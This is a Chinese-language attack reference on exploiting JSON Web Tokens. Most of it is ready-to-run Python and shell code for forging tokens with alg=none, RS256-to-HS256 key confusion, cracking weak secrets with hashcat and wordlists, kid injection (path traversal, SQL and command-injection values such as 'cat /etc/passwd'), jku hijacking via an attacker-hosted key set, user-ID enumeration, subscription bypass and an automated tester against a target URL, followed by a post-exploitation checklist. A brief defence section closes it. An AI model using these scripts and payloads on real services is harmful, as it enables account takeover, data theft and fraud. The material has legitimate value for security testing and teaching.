# JWT令牌攻击 攻击库

## 漏洞概述

JSON Web Token (JWT)是一种开放标准(RFC 7519),用于在各方之间安全地传输信息。JWT在现代Web应用中广泛用于身份验证和授权。然而,不当的JWT实现会导致严重的安全漏洞,包括权限提升、身份伪造和认证绕过。

**JWT结构**:
```
Header.Payload.Signature
```

**示例**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MDk0NTkyMDB9.5mC8QjJ0_qTRqH_IrhKqN8Xy4YsZVJT3qJg7T6xNSKs
```

解码后:
- Header: `{"alg":"HS256","typ":"JWT"}`
- Payload: `{"user":"admin","iat":1609459200}`
- Signature: 签名部分

## 核心攻击技术

### 1. 算法混淆攻击 (alg=none)

**原理**: 将算法设置为"none",移除签名验证

**场景**: 后端未正确验证算法字段

**攻击步骤**:

```python
import base64
import json

# 原始JWT
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.signature"

# 1. 修改Header,设置alg为none
header = {
    "alg": "none",
    "typ": "JWT"
}

# 2. 修改Payload,提升权限
payload = {
    "user": "admin",
    "role": "administrator"
}

# 3. Base64URL编码
def base64url_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).decode().rstrip('=')

header_encoded = base64url_encode(header)
payload_encoded = base64url_encode(payload)

# 4. 构造新JWT(无签名或空签名)
malicious_jwt = f"{header_encoded}.{payload_encoded}."
# 或
malicious_jwt = f"{header_encoded}.{payload_encoded}"

print(f"恶意JWT: {malicious_jwt}")
```

**cURL测试**:
```bash
# 使用修改后的JWT访问
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
  http://target.com/admin
```

### 2. 密钥混淆攻击 (RS256 → HS256)

**原理**: 将RS256(非对称)算法改为HS256(对称),使用公钥作为密钥签名

**场景**: 应用使用RS256,但后端也接受HS256

**攻击流程**:

```python
#!/usr/bin/env python3
import jwt
import requests

# 1. 获取公钥
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# 2. 构造恶意payload
payload = {
    "user": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# 3. 使用HS256和公钥签名
# 这会使后端用公钥验证签名(本应用私钥签名)
malicious_jwt = jwt.encode(
    payload,
    public_key,
    algorithm="HS256"
)

print(f"恶意JWT: {malicious_jwt}")

# 4. 使用恶意JWT访问
response = requests.get(
    "http://target.com/admin",
    headers={"Authorization": f"Bearer {malicious_jwt}"}
)
print(response.text)
```

**手动操作**:
```bash
# 1. 获取公钥
curl http://target.com/.well-known/jwks.json > public_key.json

# 2. 转换为PEM格式
# (使用工具或在线转换器)

# 3. 使用jwt_tool
python3 jwt_tool.py <original_jwt> -X k -pk public_key.pem
```

### 3. 弱密钥暴力破解

**原理**: JWT使用弱密钥(如"secret","password")签名,可被暴力破解

**工具**: hashcat, john, jwt_tool

**Hashcat破解**:
```bash
# 1. 准备JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.FhZHFqNx..." > jwt.txt

# 2. 使用hashcat破解
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# 3. 或使用自定义字典
hashcat -a 0 -m 16500 jwt.txt custom_passwords.txt

# 成功后显示:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...:secret123
```

**jwt_tool破解**:
```bash
# 使用字典攻击
python3 jwt_tool.py <jwt> -C -d /usr/share/wordlists/rockyou.txt

# 成功后会显示:
# [+] secret found: secretkey
```

**Python暴力破解**:
```python
import jwt
import hashlib

def crack_jwt_secret(token, wordlist_path):
    """暴力破解JWT密钥"""
    try:
        # 分离header和payload
        header, payload, signature = token.split('.')
        
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            for line in f:
                secret = line.strip()
                try:
                    # 尝试验证
                    jwt.decode(
                        token,
                        secret,
                        algorithms=["HS256", "HS384", "HS512"]
                    )
                    print(f"[+] 密钥找到: {secret}")
                    return secret
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
    except Exception as e:
        print(f"[-] 错误: {e}")
    
    print("[-] 未找到密钥")
    return None

# 使用
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
secret = crack_jwt_secret(token, "passwords.txt")
```

### 4. 空密钥攻击

**原理**: 某些JWT库接受空字符串作为密钥

**测试**:
```python
import jwt

payload = {"user": "admin", "role": "admin"}

# 使用空密钥签名
for secret in ["", b"", None]:
    try:
        token = jwt.encode(payload, secret, algorithm="HS256")
        print(f"密钥 '{secret}' 生成的JWT: {token}")
    except:
        pass
```

### 5. Kid (Key ID) 注入

**原理**: kid参数用于指定密钥,如果后端不当处理可导致任意文件读取或SQL注入

**场景1: 路径遍历**
```python
import jwt
import json
import base64

# 构造header,kid指向可预测的文件
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../../../dev/null"  # 空文件作为密钥
}

payload = {"user": "admin"}

# 使用空密钥签名(因为/dev/null内容为空)
token = jwt.encode(payload, "", algorithm="HS256", headers=header)
print(token)
```

**场景2: SQL注入**
```python
# 如果后端使用SQL查询获取密钥:
# SELECT key FROM keys WHERE kid = '<user_input>'

header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key1' OR '1'='1"  # SQL注入
}

# 或更直接的攻击
header = {
    "alg": "HS256", 
    "kid": "key1' UNION SELECT 'mykey' --"
}

# 使用已知密钥签名
token = jwt.encode(payload, "mykey", algorithm="HS256", headers=header)
```

**场景3: 命令注入**
```python
# 如果后端不当使用kid执行系统命令
header = {
    "alg": "HS256",
    "kid": "key.txt; cat /etc/passwd"
}
```

### 6. JKU/X5U URL注入

**原理**: jku和x5u参数指向密钥集的URL,攻击者可指向自己的服务器

**攻击步骤**:

```python
# 1. 在攻击者服务器上托管恶意JWK
# http://attacker.com/jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "xGOr-H7A...",
      "e": "AQAB"
    }
  ]
}

# 2. 生成对应的私钥
from jwcrypto import jwk, jwt
import json

# 创建RSA密钥对
key = jwk.JWK.generate(kty='RSA', size=2048)
private_key = key.export_private()
public_key = key.export_public()

# 3. 构造JWT,jku指向攻击者服务器
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "http://attacker.com/jwks.json",
    "kid": "attacker-key"
}

payload = {"user": "admin", "role": "admin"}

# 4. 使用攻击者的私钥签名
token = jwt.JWT(
    header=header,
    claims=payload
)
token.make_signed_token(jwk.JWK.from_json(private_key))

malicious_jwt = token.serialize()
print(f"恶意JWT: {malicious_jwt}")
```

### 7. 时间戳绕过

**过期时间(exp)操控**:
```python
import jwt
import time

# 设置远未来的过期时间
payload = {
    "user": "admin",
    "exp": 9999999999,  # 2286年
    "iat": int(time.time())
}

token = jwt.encode(payload, "secret", algorithm="HS256")
```

**nbf (Not Before)绕过**:
```python
# 设置过去的nbf时间
payload = {
    "user": "admin",
    "nbf": 1000000000,  # 2001年
    "exp": 9999999999
}
```

### 8. 声明污染

**原理**: 添加或修改JWT payload中的声明以提升权限

**常见目标字段**:
```python
payload = {
    # 用户标识
    "user": "admin",
    "username": "administrator", 
    "email": "admin@company.com",
    "sub": "1",  # 改为管理员ID
    
    # 权限相关
    "role": "admin",
    "roles": ["admin", "superuser"],
    "admin": True,
    "is_admin": True,
    "isAdmin": True,
    "permissions": ["*"],
    "scope": "admin",
    
    # 其他
    "group": "administrators",
    "account_type": "premium"
}
```

## 完整利用场景

### 场景1: 从用户提升到管理员

**初始JWT**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcjEyMyIsInJvbGUiOiJ1c2VyIn0.xyz
```

**解码**:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user": "user123",
  "role": "user"
}
```

**攻击**:
```python
#!/usr/bin/env python3
import jwt
import requests

target = "http://target.com"
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 尝试1: alg=none
print("[*] 尝试 alg=none 攻击...")
payload = {"user": "user123", "role": "admin"}
none_jwt = jwt.encode(payload, "", algorithm="none")
# 手动移除签名部分
parts = none_jwt.split('.')
none_jwt = f"{parts[0]}.{parts[1]}."

r = requests.get(f"{target}/admin", 
                headers={"Authorization": f"Bearer {none_jwt}"})
if r.status_code == 200:
    print("[+] alg=none 攻击成功!")
    print(r.text)
else:
    print("[-] alg=none 攻击失败")

# 尝试2: 弱密钥暴力破解
print("[*] 尝试弱密钥破解...")
common_secrets = ["secret", "password", "123456", "key", "jwt", "token"]

for secret in common_secrets:
    try:
        jwt.decode(original_jwt, secret, algorithms=["HS256"])
        print(f"[+] 密钥找到: {secret}")
        
        # 使用找到的密钥生成管理员JWT
        admin_payload = {"user": "user123", "role": "admin"}
        admin_jwt = jwt.encode(admin_payload, secret, algorithm="HS256")
        
        r = requests.get(f"{target}/admin",
                        headers={"Authorization": f"Bearer {admin_jwt}"})
        if "admin" in r.text.lower():
            print("[+] 权限提升成功!")
            print(r.text)
            break
    except:
        continue
```

### 场景2: IDOR via JWT

**场景**: JWT中包含user_id,修改可访问其他用户数据

```python
import jwt

# 原始JWT
original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjN9.xyz"

# 假设已破解密钥或使用none算法
secret = "leaked_secret"  # 或破解得到

# 枚举其他用户ID
for user_id in range(1, 1000):
    payload = {"user_id": user_id}
    token = jwt.encode(payload, secret, algorithm="HS256")
    
    # 尝试访问用户数据
    r = requests.get(
        f"http://target.com/api/user/profile",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if r.status_code == 200:
        print(f"[+] 用户 {user_id} 数据:")
        print(r.json())
```

### 场景3: 绕过支付验证

```python
# 原始JWT(免费用户)
payload = {
    "user": "user123",
    "subscription": "free",
    "features": ["basic"]
}

# 修改为高级用户
payload = {
    "user": "user123", 
    "subscription": "premium",
    "features": ["basic", "advanced", "api_access"],
    "credits": 999999
}

# 使用破解的密钥或alg=none
premium_jwt = jwt.encode(payload, "", algorithm="none")
```

## 自动化检测与利用工具

### 1. jwt_tool

**安装**:
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
```

**使用**:
```bash
# 扫描所有漏洞
python3 jwt_tool.py <JWT> -M at

# alg=none攻击
python3 jwt_tool.py <JWT> -X a

# 密钥混淆攻击
python3 jwt_tool.py <JWT> -X k -pk public_key.pem

# 暴力破解
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# 修改声明
python3 jwt_tool.py <JWT> -I -pc role -pv admin
```

### 2. 自定义脚本

```python
#!/usr/bin/env python3
"""
JWT全面测试脚本
"""
import jwt
import json
import base64
import requests

class JWTTester:
    def __init__(self, token, target_url):
        self.token = token
        self.url = target_url
        self.header, self.payload = self.decode_jwt(token)
    
    def decode_jwt(self, token):
        """解码JWT"""
        parts = token.split('.')
        
        # 解码header
        header = json.loads(
            base64.urlsafe_b64decode(parts[0] + '==')
        )
        
        # 解码payload
        payload = json.loads(
            base64.urlsafe_b64decode(parts[1] + '==')
        )
        
        return header, payload
    
    def test_none_alg(self):
        """测试alg=none"""
        print("[*] 测试 alg=none...")
        
        self.header['alg'] = 'none'
        self.payload['role'] = 'admin'  # 尝试提权
        
        # 构造无签名JWT
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(self.header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).decode().rstrip('=')
        
        none_token = f"{header_b64}.{payload_b64}."
        
        return self.test_token(none_token)
    
    def test_weak_secret(self):
        """测试弱密钥"""
        print("[*] 测试弱密钥...")
        
        secrets = [
            "secret", "password", "123456", "key",
            "jwt", "token", "admin", "test"
        ]
        
        for secret in secrets:
            try:
                jwt.decode(self.token, secret, algorithms=["HS256"])
                print(f"[+] 密钥找到: {secret}")
                return secret
            except:
                continue
        
        return None
    
    def test_token(self, token):
        """测试JWT是否有效"""
        try:
            r = requests.get(
                self.url,
                headers={"Authorization": f"Bearer {token}"},
                timeout=10
            )
            
            if r.status_code == 200:
                print(f"[+] Token有效! 状态码: {r.status_code}")
                return True
            else:
                print(f"[-] Token无效. 状态码: {r.status_code}")
                return False
        except Exception as e:
            print(f"[-] 错误: {e}")
            return False
    
    def run_all_tests(self):
        """运行所有测试"""
        print(f"[*] 目标: {self.url}")
        print(f"[*] 原始JWT: {self.token[:50]}...")
        print(f"[*] Header: {self.header}")
        print(f"[*] Payload: {self.payload}")
        print()
        
        # 测试alg=none
        if self.test_none_alg():
            return True
        
        # 测试弱密钥
        secret = self.test_weak_secret()
        if secret:
            # 使用找到的密钥生成管理员token
            admin_payload = self.payload.copy()
            admin_payload['role'] = 'admin'
            admin_token = jwt.encode(
                admin_payload,
                secret,
                algorithm="HS256"
            )
            
            if self.test_token(admin_token):
                return True
        
        return False

# 使用示例
if __name__ == "__main__":
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    target = "http://target.com/admin"
    
    tester = JWTTester(token, target)
    tester.run_all_tests()
```

### 3. Burp Suite插件

**JSON Web Tokens扩展**:
1. 安装"JSON Web Tokens"扩展
2. 在HTTP History中选择包含JWT的请求
3. "JSON Web Tokens"标签会显示解码的JWT
4. 可以修改header和payload
5. 自动重新编码和签名(如果有密钥)

**JWT Editor扩展**:
```
1. Extender → BApp Store → JWT Editor
2. 在Repeater中会看到JWT Editor标签
3. 可以修改alg、payload字段
4. 支持多种攻击技术
```

## 实战Checklist

### 检测阶段
- [ ] 识别JWT在哪里使用(Cookie、Authorization header、URL参数)
- [ ] 解码JWT查看header和payload
- [ ] 识别算法(HS256、RS256等)
- [ ] 查找敏感字段(role、admin、permissions等)
- [ ] 检查是否有kid、jku、x5u等参数

### 攻击阶段
- [ ] 测试alg=none
- [ ] 测试空密钥
- [ ] 暴力破解密钥(HS256/HS512)
- [ ] 测试算法混淆(RS256→HS256)
- [ ] 修改payload提升权限
- [ ] 测试kid注入(路径遍历、SQL注入)
- [ ] 测试jku/x5u劫持
- [ ] 修改时间戳(exp、nbf、iat)
- [ ] 测试IDOR(修改user_id等)

### 后利用阶段
- [ ] 枚举其他用户
- [ ] 访问管理功能
- [ ] 修改订阅/权限级别
- [ ] 持久化访问(长期有效的JWT)

## 防御措施

### 1. 算法验证
```python
# 正确的验证方式
import jwt

def verify_token(token, secret):
    try:
        # 明确指定允许的算法
        payload = jwt.decode(
            token,
            secret,
            algorithms=["HS256"]  # 只允许HS256
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

### 2. 密钥管理
```python
import secrets

# 生成强密钥
secret_key = secrets.token_urlsafe(32)  # 256位

# 定期轮换密钥
# 使用环境变量或密钥管理服务存储
```

### 3. 声明验证
```python
def verify_claims(payload):
    """验证JWT声明"""
    required_fields = ['user', 'exp', 'iat']
    
    # 检查必需字段
    for field in required_fields:
        if field not in payload:
            raise ValueError(f"缺少字段: {field}")
    
    # 验证权限
    if 'role' in payload:
        valid_roles = ['user', 'moderator', 'admin']
        if payload['role'] not in valid_roles:
            raise ValueError("无效的角色")
    
    return True
```

### 4. 使用成熟的库
```python
# 推荐使用PyJWT等成熟库
import jwt

# 避免自己实现JWT验证逻辑
```

### 5. 实施额外安全层
```python
# JWT + 会话令牌
# JWT + CSRF保护
# JWT + IP验证
# JWT + 短过期时间 + 刷新令牌机制
```

## 参考资源

- [JWT.io](https://jwt.io) - JWT编码解码工具
- [PortSwigger JWT攻击](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

**最后更新**: 2025-11-16
**适用场景**: 现代Web应用、API、微服务架构、移动应用后端
**攻击难度**: 简单到中等
**检测难度**: 容易识别JWT,但需要系统测试各种攻击向量
